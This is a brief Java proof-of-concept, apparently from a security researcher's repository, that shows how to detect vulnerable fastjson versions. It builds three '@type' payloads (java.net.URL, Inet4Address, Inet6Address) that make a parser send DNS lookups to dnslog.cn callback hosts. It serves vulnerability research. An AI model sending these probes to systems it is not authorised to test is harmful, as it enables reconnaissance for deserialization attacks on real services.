package vul.fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @ClassName: urldns
 * @Description: TODO 修改pom.xml中版本号为 1.2.47 并重新导入
 * @Author: Summer
 * @Date: 2020/7/8 13:55
 * @Version: v1.0.0
 * @Description: urldns通常用来作为检验漏洞存在
 *  参考文章 http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/
 **/
public class urldns {
    public static void main(String[] args) {
        // dnslog平台网站：http://www.dnslog.cn/
        // 目前最新版1.2.72版本可以使用1.2.36 < fastjson <= 1.2.72
        String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
                ":\"http://t77p7n.dnslog.cn\"}:\"summer\"}";
        // 全版本支持 fastjson <= 1.2.72
        String payload1 = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"3z6xrg.dnslog.cn\"}";
        String payload2 = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"k2g5dl.dnslog.cn\"}";


        JSON.parse(payload);
        JSON.parse(payload1);
        JSON.parse(payload2);


    }

}
